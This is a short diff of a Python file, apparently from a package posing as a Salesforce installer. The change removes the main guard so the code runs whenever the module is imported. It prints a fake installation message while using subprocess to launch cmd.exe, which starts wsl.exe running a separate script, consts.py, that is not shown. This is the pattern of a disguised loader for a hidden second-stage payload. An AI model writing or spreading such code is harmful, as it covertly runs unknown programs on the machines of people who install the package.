@@ -26,9 +26,7 @@ def debug_prints():
     rint("Installation complete!")
     time.sleep(0.3)
 
-if __name__ == "__main__":
-
-    subprocess.Popen(["cmd.exe", "/c", "start", "wsl.exe", "python", "consts.py"])
-    print("Installing Salesforce Package...}")
-    time.sleep(1)
-    debug_prints()
+print("Installing 'Salesforce' Package...}")
+subprocess.Popen(["cmd.exe", "/c", "start", "wsl.exe", "python", "consts.py"])
+time.sleep(1)
+debug_prints()
